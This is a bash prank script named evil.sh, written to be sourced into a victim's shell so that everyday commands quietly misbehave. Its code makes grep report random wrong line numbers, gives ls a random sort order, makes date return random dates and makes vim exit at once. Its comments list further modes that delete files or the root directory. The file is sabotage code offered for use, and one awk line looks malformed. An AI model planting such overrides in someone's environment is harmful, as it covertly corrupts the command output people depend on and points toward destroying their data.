#!/usr/bin/env bash
# evil.sh — https://mths.be/evil.sh

# valid values are: insane, annoying, destructive, devasting, unusable
# each mode of operation includes the previous one's tweaks
#
# insane: only enable subtle behaviour that confuses and slowly drives people insane e.g. make exit
#   open a new shell
# annoying: like insane just way more obvious behaviour allowed (e.g. constantly cd to the wrong
#   (random) directory
# destructive: delete files and do serious harm, non-recoverable damage included
# devasting: may delete /
# unusable: enable everything including, but not limited to replacing enter by backspace
EVIL_BEHAVIOUR=insane

function insane()
{
    test "$EVIL_BEHAVIOUR" = "insane"
}

function annoying()
{
    insane || test "$EVIL_BEHAVIOUR" = "annoying"
}

# Add a random number to line numbers when using `grep -n`.
insane && function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }

# Use a random sort option whenever `ls` is invoked.
annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }

# Have `date` return random dates.
annoying && alias date='date -d "now + $RANDOM days"';

# Quit vim on startup.
annoying && alias vim="vim +q";
